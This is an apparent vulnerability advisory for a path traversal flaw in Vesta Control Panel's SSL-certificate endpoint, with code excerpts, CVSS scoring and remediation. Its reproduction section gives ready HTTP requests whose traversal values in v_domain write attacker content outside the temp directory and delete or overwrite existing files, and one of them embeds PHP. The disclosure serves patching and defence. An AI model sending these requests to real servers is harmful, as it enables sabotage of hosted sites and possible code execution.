# Vesta Control Panel Path Traversal Arbitrary File Write and Delete

**CWE-22 · Authenticated (panel session + CSRF token) path traversal · Arbitrary transient file write and persistent arbitrary file delete/overwrite**

> **Vendor:** outroll (https://github.com/outroll)
> **Product:** Vesta Control Panel / vesta (PHP + shell backend, https://github.com/outroll/vesta)
> **Affected version:** master branch, commit 5f4ee2e (2026-07-31), latest as of 2026-09-28; no fixed release
> **Affected endpoints:** POST /api/v1/edit/web/ (SSL-certificate save branch, lines 287-339; same sink pattern repeats at lines 400-419), parameters `v_domain`, `v_ssl_crt`, `v_ssl_key`, `v_ssl_ca`
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Validation used only harmless marker payloads; no sensitive values appear in this disclosure.

## 1. Summary

The SSL-certificate handler in `web/api/v1/edit/web/index.php` composes temporary certificate file names from the **raw** `$_POST['v_domain']` — the `escapeshellarg()` at line 109 only protects the shell backend, not filesystem paths. `v_domain=../../x/y` escapes the `mktemp -d` directory: the certificate slots `fopen(...,'w')` at lines 294/302/310 write attacker-controlled content to arbitrary paths, and the cleanup `unlink()` at lines 337-339 reuses the same raw path, turning the same primitive into an unconditional arbitrary file delete / overwrite of pre-existing files ending in `.crt`/`.key`/`.ca`.

## 2. Root Cause

| File | Line | Role |
|---|---|---|
| `web/api/v1/edit/web/index.php` | 109 | `$v_domain = escapeshellarg($_POST['v_domain']);` — shell-only sanitization; raw `$_POST['v_domain']` keeps being used below |
| `web/api/v1/edit/web/index.php` | 111-115 | Session + CSRF token check — genuinely enforced |
| `web/api/v1/edit/web/index.php` | 287-289 | SSL-save branch (`$v_ssl == 'yes'`) → `exec('mktemp -d')` |
| `web/api/v1/edit/web/index.php` | 294-296 | `fopen($tmpdir."/".$_POST['v_domain'].".crt", 'w')` + `fwrite(v_ssl_crt)` — raw path |
| `web/api/v1/edit/web/index.php` | 302, 310 | Same for `.key` (`v_ssl_key`) and `.ca` (`v_ssl_ca`) |
| `web/api/v1/edit/web/index.php` | 337-339 | `unlink($tmpdir."/".$_POST['v_domain'].".crt"/".key"/".ca")` — same raw path |
| `web/api/v1/edit/web/index.php` | 400-419 | Identical sink pattern in the SSL-removal branch |

```php
// web/api/v1/edit/web/index.php:289,294-296,337
exec ('mktemp -d', $mktemp_output, $return_var);
$tmpdir = $mktemp_output[0];
...
$fp = fopen($tmpdir."/".$_POST['v_domain'].".crt", 'w');   // raw POST value in the path
fwrite($fp, str_replace("\r\n", "\n",  $_POST['v_ssl_crt']));
...
if (!empty($_POST['v_ssl_crt'])) unlink($tmpdir."/".$_POST['v_domain'].".crt"); // line 337
```

## 3. Prerequisites

- Authenticated panel session (admin or regular user editing a web domain) plus a valid CSRF token; both checks at lines 111-115 are real and were honored during verification.
- SSL enabled on the edited domain (`$v_ssl == 'yes'`) for the certificate-save branch.
- Affected paths must end `.crt`/`.key`/`.ca` and be writable by the panel user.

## 4. Reproduction

Arbitrary write (transient; captured mid-request between `fwrite` line 295 and `unlink` line 337):

```http
POST /api/v1/edit/web/ HTTP/1.1
Cookie: PHPSESSID=<panel session>
Content-Type: application/x-www-form-urlencoded

token=<valid csrf token>&domain=testdomain.tld&v_domain=../../pwn_outside_sandbox&v_ssl=save&v_ssl_crt=VESTIM-B-POC-ARBITRARY-WRITE-MARKER <?php echo md5("poc"); ?>&v_ssl_key=&v_ssl_ca=
```

Arbitrary delete/overwrite of a pre-existing file (persistent, unconditional):

```http
POST /api/v1/edit/web/ HTTP/1.1
Cookie: PHPSESSID=<panel session>
Content-Type: application/x-www-form-urlencoded

token=<valid csrf token>&domain=testdomain.tld&v_domain=../victimdir/vestim_decoy&v_ssl=save&v_ssl_crt=&v_ssl_key=&v_ssl_ca=VESTIM-C-POC-DELETE-MARKER
```

Scripted PoC: `poc/exploit.sh` (target source: `poc/TARGET-SOURCE.txt`). Raw verification transcripts: `evidence/runA_benign_control.txt`, `evidence/runB_write_outside_sandbox.txt`, `evidence/runC_delete_decoy.txt`.

## 5. Confirmed Techniques

- Verified against the **unmodified** target file (sha256 `f4b46594...7a0737`, commit 5f4ee2e) under PHP 7.4.33 with a stub panel environment enforcing the same session + CSRF checks.
- RUN A (benign control): writes only inside the `mktemp` dir, fully cleaned up.
- RUN B: marker content landed at `<tmpdir>/../../pwn_outside_sandbox.crt` (outside the temp dir and sandbox root), captured mid-request — the write is transient because the same raw `v_domain` feeds the cleanup `unlink`.
- RUN C: pre-planted decoy `vestim_decoy.ca` (sha1 `4016a313...`) overwritten with attacker content and then removed by `unlink()` at line 339 — persistent arbitrary delete confirmed.

## 6. Impact

Low-privileged panel users (or compromised panel sessions) can delete arbitrary `.crt`/`.key`/`.ca`-suffixed files within their write permissions (reliable sabotage of hosted sites and system configuration), overwrite such files with attacker content (persistent), or transiently place content at arbitrary writable paths (a won race against the cleanup unlink in a web root yields code execution).

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (Base 8.8 — High)

## 8. Remediation

1. Validate `v_domain` against a strict domain pattern before any filesystem use.
2. Use `basename()` for temporary certificate file names.
3. Contain with `realpath()` prefix check against the `mktemp` directory before `fopen`/`unlink`.
4. Fix the SSL-removal branch (lines 400-419), which repeats the pattern.

## 9. References

- Project: https://github.com/outroll/vesta
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- External disclosure: https://gist.github.com/qianqiusujiu/66f98c0956a5a1e8f89347c2dc9ab1b4
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
